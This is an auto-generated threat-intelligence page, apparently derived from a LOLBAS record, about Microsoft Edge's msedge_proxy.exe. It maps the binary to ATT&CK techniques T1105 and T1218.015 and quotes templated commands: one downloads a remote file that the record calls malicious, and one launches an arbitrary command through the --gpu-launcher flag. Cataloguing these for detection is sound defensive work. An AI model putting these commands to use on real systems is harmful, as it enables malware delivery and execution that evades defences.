---
parsed_by: focuslocust
source: lolbas
type: generated
---
# msedge_proxy.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `msedge-proxy.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/msedge_proxy.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Microsoft Edge Browser

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/msedge-proxy.md)
- Source verification: [source record](../../sources/lolbas/msedge-proxy.exe.md)

## Aliases

- `msedge-proxy.exe`
- `msedge_proxy.exe`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | explicit | source | Command metadata lists T1105: C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe {REMOTEURL:.zip} |
| [T1218.015 - Electron Applications](../../attack/techniques/T1218.015-electron-applications.md) | explicit | source | Command metadata lists T1218.015: C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher="{CMD} &&" |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/msedge-proxy.exe.md)

## Source Verification

[source record](../../sources/lolbas/msedge-proxy.exe.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@merterpreter'
Person: Mert Daş
Author: Mert Daş
Commands:
- Category: Download
Command: C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe {REMOTEURL:.zip}
Description: msedge_proxy will download malicious file.
```
